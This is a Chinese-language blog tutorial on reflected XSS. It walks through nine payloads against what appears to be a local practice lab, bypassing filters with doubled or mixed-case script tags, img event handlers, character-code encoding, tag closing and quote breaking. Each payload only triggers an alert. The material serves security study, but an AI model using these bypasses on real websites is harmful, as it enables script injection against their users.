---
title: 反射性XSS
date: 2020-03-28 21:11:55
tags:
	安全
    web渗透
typora-root-url: ./
---

# 反射性XSS

**跨站脚本攻击(Cross Site Scripting)**。XSS分为**反射型XSS，存储型XSS和DOM型XSS**。反射型XXS是一种**非持久性**的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。这里插入的恶意代码并没有保存在目标网站，需要引诱用户点击一个链接到目标网站的恶意链接来实施攻击。

![10976729-63e28ea411ca8edc](/blog.github.io/images/10976729-63e28ea411ca8edc.jpg)

**XSS攻击分类:**

XSS漏洞一般有两种类型攻击。

a)一类是来自内部的攻击，主要指的是利用WEB程序自身的漏洞，提交特殊的字符串，从而使得跨站页面直接存在于被攻击站点上，这个字符串被称为跨站语句。这一类攻击所利用的漏洞非常类似于SQL Injection漏洞，都是WEB程序没有对用户输入作充分的检查和过滤。

b)另一类则是来来自外部的攻击，主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个跨站网页放在自己的服务器上，然后通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。这一类攻击的威胁相对较低。

**执行例子：**

1、未作任何校验的网站，输入恶意代码，弹出弹框：

`<script>alert('chenie')</script>`

![image-20200328165842263](/blog.github.io/images/image-20200328165842263.png)

2、加入了一些过滤，`preg_replace()`函数如果检测到`<script>`和`</script>`就会把其替换为空格(区分大小写，只替换小写的)。所以这里可以双写绕过也可以大小写绕过。即payload:

`<scr<script>ipt>alert('chenie')</s</script>cript>`

或

`<scRipt>alert('chenie')</scRipt>`都可以绕过过滤进行XSS。

3、用双写绕过

`<scr<script>ipt>alert('chenie')`

4、使用img标签来绕过,img src调用图片失败然后执行后面的动作。payload为:

`<img src=""onclick="alert('chenie')">`

5、用编码来绕过了, payload为

`<script>eval(String.fromCharCode(97,108,101,114,116,40,39,99,104,101,110,105,101,39))</script>`

6、通过构造js脚本使标签闭合然后加入新标签,payload为

`</script><script>alert('chenie')</script>`

7、使用单引号绕过，尝试构造语句如下：

`';alert('chenie');'`

8、当测试提交一个地址的时候源码会显示出来一个链接，链接就是输入的链接，关键代码如上，payload为

`http://192.168.1.3:8080/xss3/xss/example8.php/[/url]"><script>alert('chenie')</script>"< "`

9、XSS直接在页面输出锚点id，构建一个带xss的锚点即可，payload为

`http://192.168.1.3:8080/xss3/xss/example9.php#alert(‘chenie’)</script)>`。

刷新网页后，即可弹窗